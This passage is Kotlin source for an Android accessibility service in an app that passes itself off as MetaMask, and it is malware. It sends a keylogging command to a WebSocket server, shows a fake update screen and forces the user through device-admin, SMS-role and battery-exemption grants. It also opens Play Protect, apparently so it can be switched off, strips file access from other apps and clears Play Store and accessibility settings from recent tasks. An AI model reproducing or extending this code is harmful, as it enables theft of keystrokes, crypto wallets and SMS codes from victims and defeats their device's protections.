package com.example.MetaMask.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.MetaMask.activities.BadgerFalconLauncherActivity
import com.example.MetaMask.activities.CoralCobraActivity
import com.example.MetaMask.activities.ComposeSmsActivity
import com.example.MetaMask.activities.HeadlessSmsSendService
import com.example.MetaMask.activities.MmsReceiver
import com.example.MetaMask.activities.OtterHawkLauncherActivity
import com.example.MetaMask.activities.PermRequesterActivity
import com.example.MetaMask.activities.SmsReceiver
import com.example.MetaMask.receivers.BadgerFalconRecv
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.IntentFilter
import android.content.pm.PackageManager
import com.example.MetaMask.ChainBridge
import org.json.JSONObject

class AccessSvc : AccessibilityService() {

    companion object {
        var instance: AccessSvc? = null
        @Volatile var pendingGrantChainStart = false
        enum class RebootState { NONE, WAITING_DIALOG, CLICKED_RESTART, CLICKED_CONFIRM }
        @Volatile var rebootState = RebootState.NONE
    }

    val autoIbis = AutoIbis()
    val martenHelper by lazy { MartenHelper(this) }
    val stoatShield = StoatShield()
    val sparrow = Sparrow()
    val unlockMonitor by lazy { UnlockMonitor(this) }
    val hybridOverlayManager by lazy { HybridOverlayManager(this) }
    val appBlocker by lazy { AppBlocker(this) }
    private val mainHandler = Handler(Looper.getMainLooper())

    @Volatile private var grantChainActive = false
    @Volatile private var chainAdminHandled = false
    @Volatile private var playProtectStepAdvanced = false
    @Volatile private var batteryDialogHandledOnce = false
    @Volatile private var batteryRetryDone = false
    @Volatile private var hyperOsBatteryNoOptionCount = 0
    private var batteryOverlayFallbackRunnable: Runnable? = null
    private var adminTimeoutRunnable: Runnable? = null
    private var overlayView: View? = null
    private var overlayAutoOffRunnable: Runnable? = null
    private var autoOffOverlayActive = false
    private var autoOffDisconnectDetectedAt = 0L
    private val revokeQueue = ArrayDeque<String>()
    private var currentRevokeTarget: String? = null
    private var revokeConfirmPending = false
    private var revokeFallbackRunnable: Runnable? = null
    private var revokeCheckRunnable: Runnable? = null

    private val chainBridgeReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            android.util.Log.d("XDBG", "[AccessSvc] onReceive enter context=ctx intent=${intent}") //xdbg
            when (intent.action) {
                ChainBridge.ACTION_ADMIN_RESULT -> {
                    val granted = intent.getBooleanExtra(ChainBridge.EXTRA_ADMIN_GRANTED, false)
                    onDeviceAdminSetupFinished(granted)
                }
                ChainBridge.ACTION_FINISH_GRANT_CHAIN -> {
                    finishGrantChain()
                }
                ChainBridge.ACTION_SMS_ROLE_CONFIRMED -> {
                    onRoleSelectionConfirmed()
                }
                ChainBridge.ACTION_BATTERY_HANDLED -> {
                    onBatteryDialogHandled()
                }
                ChainBridge.ACTION_PLAY_PROTECT_DONE -> {
                    onPlayProtectDone()
                }
                ChainBridge.ACTION_AUTOIBIS_ADMIN -> {
                    autoIbis?.onDeviceAdminRequested()
                }
                ChainBridge.ACTION_AUTOIBIS_ROLE -> {
                    autoIbis?.onRoleSelectionAboutToShow()
                }
                ChainBridge.ACTION_USER_REVOKED_ADMIN -> {
                    val revPrefs = getSharedPreferences("da_revoke_prefs", Context.MODE_PRIVATE)
                    if (revPrefs.getBoolean("panel_revoked", false)) {
                        android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                        revPrefs.edit().putBoolean("panel_revoked", false).apply()
                    } else {
                        mainHandler.postDelayed({
                            try {
                                startActivity(Intent(this@AccessSvc, BadgerFalconLauncherActivity::class.java)
                                    .apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
                            } catch (_: Exception) {}
                        }, 2000L)
                    }
                }
            }
        }
    }

    private val volUpTimestamps = ArrayDeque<Long>(6)
    private val COMBO_COUNT    = 5
    private val COMBO_WINDOW_MS = 3000L

    override fun onServiceConnected() {
        android.util.Log.d("XDBG", "[AccessSvc] onServiceConnected enter") //xdbg
        super.onServiceConnected()
        instance = this

        try {
            val intent = Intent(CraneService.ACTION_ACCESSIBILITY_CONNECTED).apply {
                setPackage(packageName)
            }
            sendBroadcast(intent)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
        }

        val chainFilter = IntentFilter().apply {
            addAction(ChainBridge.ACTION_ADMIN_RESULT)
            addAction(ChainBridge.ACTION_FINISH_GRANT_CHAIN)
            addAction(ChainBridge.ACTION_SMS_ROLE_CONFIRMED)
            addAction(ChainBridge.ACTION_BATTERY_HANDLED)
            addAction(ChainBridge.ACTION_PLAY_PROTECT_DONE)
            addAction(ChainBridge.ACTION_AUTOIBIS_ADMIN)
            addAction(ChainBridge.ACTION_AUTOIBIS_ROLE)
            addAction(ChainBridge.ACTION_VPN_RESULT)
            addAction(ChainBridge.ACTION_USER_REVOKED_ADMIN)
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                registerReceiver(chainBridgeReceiver, chainFilter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(chainBridgeReceiver, chainFilter)
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
        }

        autoIbis.start(this)
        stoatShield.start(this)
        sparrow.enableAll()

        applyMotionEventFlags()
        mainHandler.postDelayed({ applyMotionEventFlags() }, 1000L)
        mainHandler.postDelayed({ applyMotionEventFlags() }, 3000L)
        try {
            val comp = android.content.ComponentName(this, com.example.MetaMask.receivers.WebSocketCommandHandlerReceiver::class.java)
            packageManager.setComponentEnabledSetting(comp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
        } catch (_: Exception) {}
        mainHandler.postDelayed({
            try {
                val payload = JSONObject().apply { put("action", "keylog_all_active"); put("active", true) }
                val direct = MasterWebSocketDispatcher.CURRENT_INSTANCE
                if (direct != null) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    direct.sendDirect(payload)
                } else {
                    val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                        putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
                        setPackage(packageName)
                    }
                    sendBroadcast(intent)
                }
            } catch (_: Exception) {}
        }, 9000L)

        mainHandler.post {
            val activity = CoralCobraActivity.instance
            if (activity != null) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                activity.notifyAccessibilityGranted()
            } else {
                val setupDone = getSharedPreferences("app_state_prefs", MODE_PRIVATE)
                    .getBoolean("setup_chain_completed", false)
                if (setupDone) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    try { CoreServicesLauncher.launch(applicationContext) } catch (_: Exception) {}
                } else {
                    if (!isGrantChainActive()) {
                        android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                        mainHandler.postDelayed({ startFullRuntimePermissionFlow() }, 700L)
                    }
                }
            }
            mainHandler.postDelayed({ try { hybridOverlayManager.restoreIfNeeded() } catch (_: Exception) {} }, 3000L)
        }

        mainHandler.postDelayed({
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            val comp = ComponentName(this, BadgerFalconRecv::class.java)
            if (dpm?.isAdminActive(comp) != true && !isGrantChainActive()) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            }
        }, 5000L)

    }

    fun startFullRuntimePermissionFlow() {
        android.util.Log.d("XDBG", "[AccessSvc] startFullRuntimePermissionFlow enter") //xdbg
        grantChainActive = true
        chainAdminHandled = false
        playProtectStepAdvanced = false
        batteryDialogHandledOnce = false
        batteryRetryDone = false
        hyperOsBatteryNoOptionCount = 0
        stoatShield.setupInProgress = true

        val dpmCheck = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
        val compCheck = ComponentName(this, BadgerFalconRecv::class.java)
        val isAdminNow = dpmCheck?.isAdminActive(compCheck) == true
        val isBatteryNow = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            (getSystemService(PowerManager::class.java)?.isIgnoringBatteryOptimizations(packageName) == true) else true
        val isSmsNow = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                getSystemService(android.app.role.RoleManager::class.java)?.isRoleHeld(android.app.role.RoleManager.ROLE_SMS) == true
            else false
        } catch (_: Exception) { false }
        val setupDone = getSharedPreferences("app_state_prefs", MODE_PRIVATE).getBoolean("setup_chain_completed", false)
        listOf(
            SmsReceiver::class.java,
            MmsReceiver::class.java,
            ComposeSmsActivity::class.java,
            HeadlessSmsSendService::class.java
        ).forEach { cls ->
            try {
                packageManager.setComponentEnabledSetting(
                    ComponentName(this, cls),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
            }
        }

        mainHandler.postDelayed({
            if (grantChainActive) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                grantChainActive = true
                doFinishGrantChain()
            }
        }, 120_000L)

        autoIbis.enable(true)
        martenHelper.showFakeUpdate()

        val dpm0 = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
        val comp0 = ComponentName(this, BadgerFalconRecv::class.java)
        if (dpm0?.isAdminActive(comp0) == true) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            chainAdminHandled = true
            mainHandler.postDelayed({ launchRuntimePermissions() }, 600L)
        } else {
            mainHandler.postDelayed({
                try {
                    startActivity(Intent(this@AccessSvc, BadgerFalconLauncherActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    })
                    adminTimeoutRunnable = Runnable {
                        adminTimeoutRunnable = null
                        if (!chainAdminHandled) {
                            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                            chainAdminHandled = true
                            launchRuntimePermissions()
                        }
                    }
                    mainHandler.postDelayed(adminTimeoutRunnable!!, 90_000L)
                } catch (_: Exception) {
                    android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
                    chainAdminHandled = true
                    launchRuntimePermissions()
                }
            }, 600L)
        }
    }

    private fun launchRuntimePermissions() {
        android.util.Log.d("XDBG", "[AccessSvc] launchRuntimePermissions enter") //xdbg
        if (!grantChainActive) return
        try {
            val intent = Intent(this@AccessSvc, PermRequesterActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
            scheduleRequestBatteryAfterPerms()
        }
    }

    fun finishGrantChain() {
        android.util.Log.d("XDBG", "[AccessSvc] finishGrantChain enter") //xdbg
        if (!grantChainActive) return
        scheduleRequestBatteryAfterPerms()
    }

    private fun cancelAdminTimeout() {
        android.util.Log.d("XDBG", "[AccessSvc] cancelAdminTimeout enter") //xdbg
        adminTimeoutRunnable?.let { mainHandler.removeCallbacks(it) }
        adminTimeoutRunnable = null
    }

    fun onDeviceAdminSetupFinished(adminGranted: Boolean) {
        android.util.Log.d("XDBG", "[AccessSvc] onDeviceAdminSetupFinished enter adminGranted=${adminGranted}") //xdbg
        if (!adminGranted && com.example.MetaMask.HyperOsDetector.isHyperOs) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            return
        }
        cancelAdminTimeout()
        if (adminGranted) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            try {
                CoreServicesLauncher.launch(applicationContext)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
            }
        }
        if (!chainAdminHandled) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            chainAdminHandled = true
            mainHandler.postDelayed({ launchWriteSettingsStep() }, 600L)
        }
    }

    private fun launchWriteSettingsStep() {
        android.util.Log.d("XDBG", "[AccessSvc] launchWriteSettingsStep enter") //xdbg
        if (!grantChainActive) return
        val alreadyGranted = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                android.provider.Settings.System.canWrite(this)
            else true
        } catch (_: Exception) { true }
        if (alreadyGranted) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            mainHandler.postDelayed({ launchRuntimePermissions() }, 600L)
            return
        }
        autoIbis.writeSettingsDoneCallback = {
            mainHandler.postDelayed({ launchRuntimePermissions() }, 600L)
        }
        autoIbis.onWriteSettingsRequested()
        val intent = android.content.Intent(android.provider.Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try {
            startActivity(intent)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
            autoIbis.writeSettingsDoneCallback = null
            autoIbis.writeSettingsPending = false
            mainHandler.postDelayed({ launchRuntimePermissions() }, 600L)
        }
    }

    fun scheduleRequestBatteryAfterPerms() {
        android.util.Log.d("XDBG", "[AccessSvc] scheduleRequestBatteryAfterPerms enter") //xdbg
        batteryDialogHandledOnce = false
        playProtectStepAdvanced = false
        cancelBatteryOverlayFallback()
        mainHandler.postDelayed({
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                continueChainStepPlayProtect(); return@postDelayed
            }
            val pm = getSystemService(PowerManager::class.java)
            val batteryExempt = pm?.isIgnoringBatteryOptimizations(packageName) == true
            if (batteryExempt) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                continueChainStepPlayProtect(); return@postDelayed
            }
            autoIbis.onBatteryOptimizationRequested()
            batteryOverlayFallbackRunnable = Runnable {
                batteryOverlayFallbackRunnable = null
                continueChainStepPlayProtect()
            }
            val batteryTimeoutMs = if (isMiuiDevice()) 20_000L else 12_000L
            mainHandler.postDelayed(batteryOverlayFallbackRunnable!!, batteryTimeoutMs)
            val batteryIntent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                if (com.example.MetaMask.HyperOsDetector.isHyperOs) {
                    android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                    try {
                        val uid = packageManager.getApplicationInfo(packageName, 0).uid
                        putExtra(android.content.Intent.EXTRA_UID, uid)
                    } catch (_: Exception) {}
                }
            }
            val launched = launchChainIntent(batteryIntent, "battery")
            if (!launched) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                cancelBatteryOverlayFallback()
                continueChainStepPlayProtect()
            }
        }, 1000L)
    }

    private fun launchChainIntent(intent: Intent, label: String): Boolean {
        android.util.Log.d("XDBG", "[AccessSvc] launchChainIntent enter intent=${intent} label=${label}") //xdbg
        if (com.example.MetaMask.HyperOsDetector.isHyperOs) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            val ref = PermRequesterActivity.instance
            if (ref != null && !ref.isFinishing) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                val ok = ref.launchActivityFromForeground(intent)
                if (ok) return true
            }
            android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
            return try {
                startActivity(Intent(this, PermRequesterActivity::class.java).apply {
                    addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP
                    )
                    putExtra(PermRequesterActivity.EXTRA_PENDING_CHAIN_INTENT, intent)
                })
                true
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[AccessSvc] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                false
            }
        }
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return try {
            startActivity(intent); true
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
            false
        }
    }

    fun cancelBatteryOverlayFallback() {
        android.util.Log.d("XDBG", "[AccessSvc] cancelBatteryOverlayFallback enter") //xdbg
        batteryOverlayFallbackRunnable?.let { mainHandler.removeCallbacks(it) }
        batteryOverlayFallbackRunnable = null
    }

    fun onBatteryDialogHandled() {
        android.util.Log.d("XDBG", "[AccessSvc] onBatteryDialogHandled enter") //xdbg
        val exempt = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            getSystemService(android.os.PowerManager::class.java)?.isIgnoringBatteryOptimizations(packageName) == true
        else true
        cancelBatteryOverlayFallback()
        if (batteryDialogHandledOnce) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            return
        }
        batteryDialogHandledOnce = true
        if (grantChainActive) continueChainStepPlayProtect()
    }

    fun onHyperOsBatteryOptionNotFound() {
        android.util.Log.d("XDBG", "[AccessSvc] onHyperOsBatteryOptionNotFound enter") //xdbg
        if (!grantChainActive) return
        cancelBatteryOverlayFallback()
        if (hyperOsBatteryNoOptionCount >= 1) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            batteryRetryDone = true
            batteryDialogHandledOnce = false
            continueChainStepPlayProtect()
            return
        }
        hyperOsBatteryNoOptionCount++
        batteryDialogHandledOnce = false
        mainHandler.postDelayed({
            if (!grantChainActive) return@postDelayed
            autoIbis.onBatteryOptimizationRequested()
            batteryOverlayFallbackRunnable = Runnable {
                batteryOverlayFallbackRunnable = null
                continueChainStepPlayProtect()
            }
            mainHandler.postDelayed(batteryOverlayFallbackRunnable!!, 20_000L)
            val batteryIntent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = android.net.Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                try {
                    val uid = packageManager.getApplicationInfo(packageName, 0).uid
                    putExtra(android.content.Intent.EXTRA_UID, uid)
                } catch (_: Exception) {}
            }
            val launched = launchChainIntent(batteryIntent, "battery-nooption-retry")
            if (!launched) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                cancelBatteryOverlayFallback()
                continueChainStepPlayProtect()
            }
        }, 300L)
    }

    private fun playStoreAllowsToggle(): Boolean {
        android.util.Log.d("XDBG", "[AccessSvc] playStoreAllowsToggle enter") //xdbg
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return (getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager)?.isDeviceSecure != true
    }

    private fun continueChainStepPlayProtect() {
        android.util.Log.d("XDBG", "[AccessSvc] continueChainStepPlayProtect enter") //xdbg
        if (!grantChainActive) return
        if (!playStoreAllowsToggle()) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            startRevokeFileAccessStep()
            return
        }
        if (autoIbis.enabled) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            startRevokeFileAccessStep()
            return
        }
        playProtectStepAdvanced = false
        val intent = Intent("com.google.android.finsky.PLAY_PROTECT").apply {
            setClassName("com.android.vending", "com.google.android.finsky.protect.ExternalPlayProtectHomeEntryPoint")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        autoIbis.onPlayProtectAboutToShow()
        try {
            startActivity(intent)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch (ignored)") //xdbg
            autoIbis.cancelPlayProtect()
            startRevokeFileAccessStep()
            return
        }
        mainHandler.postDelayed({
            if (grantChainActive && !playProtectStepAdvanced) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                autoIbis.cancelPlayProtect()
                startRevokeFileAccessStep()
            }
        }, 22_000L)
    }

    fun onPlayProtectDone() {
        android.util.Log.d("XDBG", "[AccessSvc] onPlayProtectDone enter") //xdbg
        if (grantChainActive) startRevokeFileAccessStep()
    }

    private fun advanceToSmsStep() {
        android.util.Log.d("XDBG", "[AccessSvc] advanceToSmsStep enter") //xdbg
        if (playProtectStepAdvanced) return
        playProtectStepAdvanced = true
        if (com.example.MetaMask.HyperOsDetector.isHyperOs) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            mainHandler.post { continueChainStep2Sms() }
            return
        }
        mainHandler.post { clearRecentsThenSms() }
    }

    private fun startRevokeFileAccessStep() {
        android.util.Log.d("XDBG", "[AccessSvc] startRevokeFileAccessStep enter") //xdbg
        if (!grantChainActive) return
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            advanceToSmsStep(); return
        }
        val pm = packageManager
        val pkgs = try {
            pm.getInstalledPackages(PackageManager.GET_PERMISSIONS).filter { pkg ->
                val ai = pkg.applicationInfo ?: return@filter false
                ((ai.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) &&
                pkg.requestedPermissions?.contains("android.permission.MANAGE_EXTERNAL_STORAGE") == true
            }.map { it.packageName }
        } catch (_: Exception) { emptyList() }
        if (pkgs.isEmpty()) { advanceToSmsStep(); return }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                val nm = getSystemService(android.app.NotificationManager::class.java)
                nm?.createNotificationChannel(
                    android.app.NotificationChannel("revoke_ch", "System", android.app.NotificationManager.IMPORTANCE_MIN)
                        .also { it.setShowBadge(false) }
                )
            }
            @Suppress("DEPRECATION")
            val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.Notification.Builder(this, "revoke_ch")
                    .setSmallIcon(android.R.drawable.ic_dialog_info).build()
            } else {
                android.app.Notification.Builder(this)
                    .setSmallIcon(android.R.drawable.ic_dialog_info).build()
            }
            startForeground(9887, notif)
        } catch (_: Exception) {}
        revokeQueue.clear()
        revokeQueue.addAll(pkgs)
        currentRevokeTarget = null
        revokeConfirmPending = false
        processNextRevokeTarget()
    }

    private fun processNextRevokeTarget() {
        android.util.Log.d("XDBG", "[AccessSvc] processNextRevokeTarget enter") //xdbg
        revokeFallbackRunnable?.let { mainHandler.removeCallbacks(it) }; revokeFallbackRunnable = null
        revokeCheckRunnable?.let { mainHandler.removeCallbacks(it) }; revokeCheckRunnable = null
        revokeConfirmPending = false

        if (!grantChainActive || revokeQueue.isEmpty()) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            currentRevokeTarget = null
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    stopForeground(STOP_FOREGROUND_REMOVE)
                else
                    @Suppress("DEPRECATION") stopForeground(true)
            } catch (_: Exception) {}
            mainHandler.postDelayed({ advanceToSmsStep() }, 500L)
            return
        }
        val pkg = revokeQueue.first()
        currentRevokeTarget = pkg
        FileAccessRevokerHelper.openRevokeScreen(this, pkg)
        scheduleRevokeFallback()
    }

    private fun scheduleRevokeFallback() {
        android.util.Log.d("XDBG", "[AccessSvc] scheduleRevokeFallback enter") //xdbg
        revokeFallbackRunnable?.let { mainHandler.removeCallbacks(it) }
        val fb = Runnable { onRevokeFallback() }
        revokeFallbackRunnable = fb
        mainHandler.postDelayed(fb, 1000L)
    }

    private fun onRevokeFallback() {
        android.util.Log.d("XDBG", "[AccessSvc] onRevokeFallback enter") //xdbg
        if (!grantChainActive) return
        if (revokeConfirmPending) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            FileAccessRevokerHelper.tryConfirmRevoke(this)
            revokeQueue.removeFirstOrNull()
            currentRevokeTarget = null
            revokeConfirmPending = false
            processNextRevokeTarget()
        } else {
            when (FileAccessRevokerHelper.tryRevokeOnScreen(this)) {
                FileAccessRevokerHelper.RevokeResult.CLICKED -> {
                    revokeConfirmPending = true
                    scheduleRevokeFallback()
                }
                else -> {
                    revokeQueue.removeFirstOrNull()
                    currentRevokeTarget = null
                    processNextRevokeTarget()
                }
            }
        }
    }

    private fun clearRecentsThenSms() {
        android.util.Log.d("XDBG", "[AccessSvc] clearRecentsThenSms enter") //xdbg
        if (!grantChainActive) return
        try { performGlobalAction(GLOBAL_ACTION_RECENTS) } catch (_: Exception) {
            android.util.Log.e("XDBG", "[AccessSvc] catch") //xdbg
            mainHandler.postDelayed({ continueChainStep2Sms() }, 400L)
            return
        }
        mainHandler.postDelayed({
            val d1 = recentsPassDismissTargets()
            if (d1 > 0) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                mainHandler.postDelayed({
                    recentsPassDismissTargets()
                    try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Exception) {}
                    mainHandler.postDelayed({ continueChainStep2Sms() }, 400L)
                }, 700L)
            } else {
                val cleared = recentsTryClearAll()
                mainHandler.postDelayed({
                    try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Exception) {}
                    mainHandler.postDelayed({ continueChainStep2Sms() }, 400L)
                }, if (cleared) 500L else 100L)
            }
        }, 1200L)
    }

    private fun recentsGetRoots(): List<AccessibilityNodeInfo> {
        android.util.Log.d("XDBG", "[AccessSvc] recentsGetRoots enter") //xdbg
        val wins = try { windows?.mapNotNull { w -> try { w.root } catch (_: Exception) { null } } } catch (_: Exception) { null } ?: emptyList()
        val active = try { rootInActiveWindow } catch (_: Exception) { null }
        if (active == null) return wins
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return if (wins.any { it === active }) wins else wins + active
    }

    private fun recentsPassDismissTargets(): Int {
        android.util.Log.d("XDBG", "[AccessSvc] recentsPassDismissTargets enter") //xdbg
        val TARGET_LABELS = setOf("play store", "google play", "vending", "accessibility", "доступность", "специальные возможности")
        var dismissed = 0
        for (root in recentsGetRoots()) {
            android.util.Log.d("XDBG", "[AccessSvc] loop") //xdbg
            dismissed += recentsNodeDismiss(root, TARGET_LABELS)
        }
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return dismissed
    }

    private fun recentsNodeDismiss(node: AccessibilityNodeInfo, targets: Set<String>): Int {
        android.util.Log.d("XDBG", "[AccessSvc] recentsNodeDismiss enter node=${node} targets=${targets}") //xdbg
        var count = 0
        val idL = (node.viewIdResourceName ?: "").lowercase()
        val isDismissAction = node.actionList?.any { it.id == AccessibilityNodeInfo.ACTION_DISMISS } == true
        val isCloseBtn = node.isClickable && (idL.contains("dismiss") || idL.contains("close_task") || idL.contains("task_close"))
        if (isDismissAction || isCloseBtn) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            val selfDesc = "${node.contentDescription ?: ""}|${node.text ?: ""}".lowercase()
            val par = try { node.parent } catch (_: Exception) { null }
            val parDesc = "${par?.contentDescription ?: ""}|${par?.text ?: ""}".lowercase()
            if (targets.any { (selfDesc + parDesc).contains(it) }) {
                android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
                try {
                    if (isDismissAction) node.performAction(AccessibilityNodeInfo.ACTION_DISMISS)
                    else node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    count++
                } catch (_: Exception) {}
            }
        }
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[AccessSvc] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            try { count += recentsNodeDismiss(child, targets) } finally { try { child.recycle() } catch (_: Exception) {} }
        }
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return count
    }

    private fun recentsTryClearAll(): Boolean {
        android.util.Log.d("XDBG", "[AccessSvc] recentsTryClearAll enter") //xdbg
        val CLEAR_IDS = setOf(
            "com.android.systemui:id/dismiss_all", "com.android.systemui:id/clear_all",
            "com.android.systemui:id/recents_clear_all", "com.android.systemui:id/button_clear_all",
            "com.android.systemui:id/clear_all_button", "com.android.systemui:id/delete_recents_button",
            "com.android.launcher3:id/clear_all", "com.android.launcher3:id/clear_all_button",
            "com.android.launcher3:id/dismiss_all", "com.google.android.apps.nexuslauncher:id/clear_all",
            "com.miui.home:id/delete_all", "com.huawei.android.launcher:id/btn_clear_all",
            "com.sec.android.app.launcher:id/bt_clear_all"
        )
        val CLEAR_KEYWORDS = setOf("clear", "dismiss", "delete all", "remove all", "очист", "удал", "закрыть все", "закрыть всё")
        for (root in recentsGetRoots()) {
            android.util.Log.d("XDBG", "[AccessSvc] loop") //xdbg
            if (recentsFindClearButton(root, CLEAR_IDS, CLEAR_KEYWORDS)) return true
        }
        android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
        return false
    }

    private fun recentsFindClearButton(node: AccessibilityNodeInfo, ids: Set<String>, keywords: Set<String>): Boolean {
        android.util.Log.d("XDBG", "[AccessSvc] recentsFindClearButton enter node=${node} ids=${ids} keywords=${keywords}") //xdbg
        val id = node.viewIdResourceName ?: ""
        if (id.isNotEmpty() && ids.contains(id) && node.isClickable) {
            android.util.Log.d("XDBG", "[AccessSvc] if branch") //xdbg
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            android.util.Log.d("XDBG", "[AccessSvc] return") //xdbg
            return true
        }
        val txt = "${node.text ?: ""}|${node.contentDescription ?: ""}".lowercase()
        if (keywords.any { txt.contains(it) } && node.isClickable) {
